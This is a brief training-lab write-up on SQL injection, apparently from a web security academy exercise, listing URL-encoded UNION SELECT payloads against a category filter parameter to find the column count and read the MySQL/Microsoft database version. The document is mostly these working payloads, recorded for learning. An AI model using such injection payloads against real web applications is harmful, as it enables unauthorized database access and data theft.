# lab-querying-database-version-mysql-microsoft

Comment sign is "#" (%23 url-encoded).

`/filter?category=Lifestyle%27+UNION+SELECT+NULL%23`: Internal Server Error

`/filter?category=Lifestyle%27+UNION+SELECT+NULL,+NULL%23`: Ok (2 columns)

`/filter?category=Lifestyle%27+UNION+SELECT+@@version,+NULL%23`: Solved
